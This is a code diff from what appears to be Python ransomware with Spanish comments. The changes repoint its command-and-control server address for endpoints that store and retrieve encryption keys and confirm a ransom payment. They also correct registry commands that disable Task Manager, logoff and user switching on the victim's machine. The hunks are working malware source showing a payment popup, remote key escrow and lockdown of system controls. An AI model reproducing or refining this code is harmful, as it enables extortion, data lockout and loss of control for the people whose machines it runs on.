@@ -41,7 +41,7 @@ def show_payment_popup(directories, sk):
     def confirm_payment(directories):
         # Lógica de comunicación con el servidor Flask para confirmar el pago
         try:
-            url = "http://192.168.1.137:5000/confirm_payment"
+            url = "http://192.168.1.131:5000/confirm_payment"
             payload = json.dumps({"payment_confirmed": True})
             headers = {'Content-Type': 'application/json'}
 
@@ -49,7 +49,7 @@ def show_payment_popup(directories, sk):
 
             if response.status_code == 200:
                 # Recuperar la clave privada del servidor
-                sk_response = requests.get("http://192.168.1.137:5000/get_private_key")  
+                sk_response = requests.get("http://192.168.1.131:5000/get_private_key")  
                 if sk_response.status_code == 200:
                     private_key_pem = sk_response.json().get("private_key")
                     sk = serialization.load_pem_private_key(private_key_pem.encode(), password=None)  # Convertir la clave PEM a un objeto clave privada
@@ -136,7 +136,7 @@ def stopAndDeleteNecessaryItems():
             "/v DisableTaskMgr /t REG_DWORD /d 1 /f",
             "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
             "/v HideFastUserSwitching /t REG_DWORD /d 1 /f",
-            "REG HKCU HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer "
+            "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer "
             "/v NoLogoff /t REG_DWORD /d 1 /f",
             "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
             "/v DisableSwitchUser /t REG_DWORD /d 1 /f",
@@ -391,7 +391,7 @@ def getStoredPublicKey():
     Intenta recuperar la clave pública almacenada en el servidor.
     """
     try:
-        response = requests.get("http://192.168.1.137:5000/get_key")
+        response = requests.get("http://192.168.1.131:5000/get_key")
         if response.status_code == 200:
             public_key_pem = response.json().get("public_key")
             if public_key_pem:
@@ -437,7 +437,7 @@ def generatePairKeys():
     # Enviar la clave pública y privada al servidor
     try:
         response = requests.post(
-            "http://192.168.1.137:5000/store_key",
+            "http://192.168.1.131:5000/store_key",
             json={
                 "public_key": public_key_pem.decode(),
                 "private_key": private_key_pem.decode() 
